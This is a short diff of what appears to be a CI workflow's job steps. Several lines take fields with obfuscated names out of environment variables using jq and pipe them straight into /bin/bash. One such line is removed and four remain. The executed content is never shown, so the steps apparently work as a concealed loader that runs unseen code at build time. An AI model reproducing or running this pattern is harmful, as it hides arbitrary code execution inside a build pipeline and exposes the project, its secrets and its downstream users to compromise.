@@ -25,7 +25,6 @@ jobs:
           echo $if9 | jq -r .v62974 | /bin/bash
           printf '%s' "$o11559" | jq -r .xlv237 | /bin/bash
           printf '%s' "$zsi1857" | jq -r .h467 | /bin/bash
-          printf '%s' "$xik68368" | jq -r .eesbt1416 | /bin/bash
           printf '%s' "$iva7053" | jq -r .g5 | /bin/bash
 
       - name: Save archive
